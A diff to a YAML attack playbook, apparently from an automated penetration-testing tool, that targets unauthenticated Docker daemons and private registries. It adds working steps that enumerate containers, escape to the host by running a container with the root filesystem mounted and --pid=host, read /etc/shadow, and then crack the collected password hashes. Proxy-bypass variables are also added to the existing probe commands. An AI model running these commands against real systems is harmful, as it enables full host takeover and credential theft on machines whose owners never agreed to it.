@@ -17,28 +17,42 @@ steps:
   timeout: 600
 - id: daemon_version
   phase: enum
-  run: curl -s -m 15 http://{target}:2375/version
+  run: NO_PROXY={target} no_proxy={target} curl -s -m 15 http://{target}:2375/version
   description: probe the unauthenticated daemon API
   timeout: 60
   capture: docker_version
   continue_on_error: true
 - id: daemon_images
   phase: enum
-  run: curl -s -m 15 http://{target}:2375/images/json
+  run: NO_PROXY={target} no_proxy={target} curl -s -m 15 http://{target}:2375/images/json
   description: list images through the open daemon
   timeout: 60
   capture: docker_images
   continue_on_error: true
+- id: daemon_containers
+  phase: enum
+  run: NO_PROXY={target} no_proxy={target} docker -H tcp://{target}:2375 ps --format '{{.Names}}'
+  description: list running containers through the open daemon
+  timeout: 60
+  capture: docker_containers
+  continue_on_error: true
+- id: daemon_escape
+  phase: exploit
+  run: NO_PROXY={target} no_proxy={target} docker -H tcp://{target}:2375 run --rm -v /:/mnt --pid=host alpine sh -c 'id; hostname; cat /mnt/etc/shadow 2>/dev/null | head -5'
+  description: mount the host filesystem and prove root-level container escape
+  timeout: 300
+  capture: docker_escape
+  continue_on_error: true
 - id: registry_catalog
   phase: enum
-  run: curl -s -m 15 http://{target}:5000/v2/_catalog
+  run: NO_PROXY={target} no_proxy={target} curl -s -m 15 http://{target}:5000/v2/_catalog
   description: list private registry repositories
   timeout: 60
   capture: registry_catalog
   continue_on_error: true
 - id: registry_tags
   phase: enum
-  run: curl -s -m 15 http://{target}:5000/v2/{registry_repo}/tags/list
+  run: NO_PROXY={target} no_proxy={target} curl -s -m 15 http://{target}:5000/v2/{registry_repo}/tags/list
   description: tag list for the first catalog repo
   timeout: 60
   capture: registry_tags
@@ -53,6 +67,12 @@ steps:
   run: create_session_json
   description: record the session when a shell landed
   timeout: 300
+  continue_on_error: true
+- id: crack_shadow
+  phase: post_exploitation
+  run: crack_facts {target}
+  description: crack crypt hashes spooled into the FactStore and feed the world model
+  timeout: 1800
   continue_on_error: true
 tags:
 - docker
